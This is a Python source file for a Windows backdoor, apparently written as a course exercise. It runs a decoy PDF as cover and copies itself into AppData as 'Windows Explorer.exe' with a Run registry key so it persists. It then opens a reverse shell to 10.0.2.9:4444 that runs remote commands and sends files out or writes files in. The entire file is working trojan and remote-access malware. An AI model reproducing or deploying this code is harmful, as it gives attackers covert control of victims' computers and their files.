#!/usr/bin/env python

import socket
# This library allows us to stablish the connection or the pipe used to transfer data

import subprocess
import json  # JavaScript Object Notation used for packaging
import os
import base64
import sys
import shutil


class Backdoor:

    def __init__(self, ip, port): # Constructor
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # socket(Address_family, Socket_type) --> address_family most of the time = AF_INET,
        # socket type in most senarios(for tcp connection) = SCOCK_STREAM 
        self.connection.connect((ip, port))
        # Two brackets reason -> connect method takes tuple

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data): # To send data after packaging i.e, json packaging
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:  # Using while loop for receiving file completely
            try:
                json_data = json_data + self.connection.recv(1024)  # recv(size of each batch of data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during execution, command not found or incorrect command."

            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\LetUsC.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("10.0.2.9", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
